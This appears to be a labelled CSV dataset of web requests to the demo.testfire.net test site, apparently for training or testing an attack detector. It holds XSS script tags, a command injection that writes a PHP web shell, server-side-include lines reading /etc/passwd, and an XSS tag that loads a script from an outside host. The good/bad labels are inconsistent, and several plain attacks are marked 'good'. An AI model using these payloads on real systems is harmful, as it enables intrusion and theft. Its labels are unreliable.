path,content,host,class_flag
/search.jsp?query=echo+'<script>alert(1)</script>'//+XXXXXXXXXXX,,demo.testfire.net,['good']
/search.jsp?query=echo+echo+'<script>alert(1)</script>'//+XXXXXXXXXXX,,demo.testfire.net,['good']
"/search.jsp?query=&&+echo+""<?php+system($_GET['cmd']);+?>""+>+cmd.php",,demo.testfire.net,['bad']
/search.jsp?query=;echo+'<script>alert(1)</script>',,demo.testfire.net,['good']
/search.jsp?query=echo+echo+'<script>alert(1)</script>'//+XXXXXXXXXXX,,demo.testfire.net,['good']
"/search.jsp?query=|+echo+""<?php+include($_GET['page'])|+?>""+>+rfi.php",,demo.testfire.net,['good']
/search.jsp?query=&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,,demo.testfire.net,['bad']
/search.jsp?query=;echo%20'<script>alert(1)</script>',,demo.testfire.net,['good']
/search.jsp?query=echo+'<script+src=https://crowdshield.com/.testing/xss.js></script>'//+XXXXXXXXXXX,,demo.testfire.net,['good']
/doLogin,uid=%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fbin%2Fcat%2520%2Fetc%2Fpasswd%26quot%3B--%26gt%3B&passw=%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fbin%2Fcat%2520%2Fetc%2Fpasswd%26quot%3B--%26gt%3B&btnSubmit=Login,demo.testfire.net,['good']
/search.jsp?query=&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,,demo.testfire.net,['bad']
/sendFeedback,cfile=comments.txt&name=%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fbin%2Fcat%2520%2Fetc%2Fpasswd%26quot%3B--%26gt%3B&email_addr=%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fbin%2Fcat%2520%2Fetc%2Fpasswd%26quot%3B--%26gt%3B&subject=%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fbin%2Fcat%2520%2Fetc%2Fpasswd%26quot%3B--%26gt%3B&comments=%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fbin%2Fcat%2520%2Fetc%2Fpasswd%26quot%3B--%26gt%3B%0D%0A&submit=+Submit+,demo.testfire.net,['good']
/search.jsp?query=asdasdasdasdasd,,demo.testfire.net,['good']
/search.jsp?query=asdasdasdasdasd,,demo.testfire.net,['good']
/search.jsp?query=&lt;!--#exec cmd=&quot;/bin/cat /etc/passwd&quot;--&gt;,,demo.testfire.net,['bad']
